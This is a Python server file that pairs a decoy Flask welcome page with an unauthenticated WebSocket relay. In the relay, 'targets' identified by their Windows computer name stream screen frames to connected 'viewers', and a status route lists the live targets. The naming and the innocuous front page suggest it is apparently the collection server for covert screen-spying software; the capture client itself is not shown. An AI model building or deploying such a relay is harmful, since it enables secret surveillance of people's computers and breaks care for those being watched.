import json
import os
import asyncio
import logging
import uvicorn

# Import Flask and the ASGI-to-WSGI adapter
from flask import Flask, render_template_string
from a2wsgi import WSGIMiddleware

logging.basicConfig(level=logging.INFO)

# ==========================================
# 1. DEFINE YOUR FLASK SITE
# ==========================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home_page():
    # You can return HTML files here using render_template('index.html')
    return render_template_string("""
        <!DOCTYPE html>
        <html>
        <head><title>My Flask Site</title></head>
        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
            <h1>Welcome to the Flask Web Page</h1>
            <p>This page is served by Flask, while WebSockets run in the background!</p>
        </body>
        </html>
    """)

@flask_app.route('/status')
def status_page():
    return {"status": "Server running", "active_targets": list(live_targets.keys())}

# Wrap the Flask app so the async Uvicorn server can speak to it
wsgi_middleware = WSGIMiddleware(flask_app)


# ==========================================
# 2. YOUR EXACT WEBSOCKET LOGIC
# ==========================================
live_targets = {}      # { "Target-PC": send_coroutine }
connected_viewers = set()  # { send_coroutine, send_coroutine }

async def broadcast_to_viewers(payload_dict):
    if not connected_viewers:
        return
    message = {
        "type": "websocket.send",
        "text": json.dumps(payload_dict)
    }
    await asyncio.gather(*[viewer(message) for viewer in list(connected_viewers)], return_exceptions=True)

async def websocket_handler(scope, receive, send):
    await send({'type': 'websocket.accept'})
    client_type = None
    target_name = None
    
    try:
        while True:
            try:
                message = await asyncio.wait_for(receive(), timeout=15.0)
            except asyncio.TimeoutError:
                break
            
            if message['type'] == 'websocket.disconnect':
                break
            
            if 'text' in message:
                payload = json.loads(message['text'])
                msg_type = payload.get("type")
                
                if msg_type == "register_viewer":
                    client_type = "viewer"
                    connected_viewers.add(send)
                    await send({
                        'type': 'websocket.send',
                        'text': json.dumps({"type": "list", "data": list(live_targets.keys())})
                    })
                
                elif msg_type == "register_target":
                    client_type = "target"
                    target_name = payload.get("COMPUTERNAME", "Unknown-Target")
                    live_targets[target_name] = send
                    await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
                
                elif msg_type == "stream_frame" and client_type == "target":
                    frame_data = payload.get("frame")
                    await broadcast_to_viewers({
                        "type": "frame",
                        "user": target_name,
                        "frame": frame_data
                    })
                    await send({
                        'type': 'websocket.send',
                        'text': json.dumps({"status": "OK"})
                    })
                    
    except Exception as e:
        logging.error(f"WebSocket Error: {e}")
    finally:
        if client_type == "viewer" and send in connected_viewers:
            connected_viewers.remove(send)
        elif client_type == "target" and target_name in live_targets:
            del live_targets[target_name]
            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})


# ==========================================
# 3. CENTRAL ROUTER (THE APP ENTRY POINT)
# ==========================================
async def app(scope, receive, send):
    """
    This main router acts like a traffic cop. 
    It checks what kind of connection is coming in.
    """
    # If the connection request is a WebSocket connection, pass it to your websocket handler
    if scope['type'] == 'websocket':
        await websocket_handler(scope, receive, send)
        return

    # If it's standard web traffic (GET/HEAD/POST), pass it down to Flask
    if scope['type'] == 'http':
        await wsgi_middleware(scope, receive, send)
        return


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")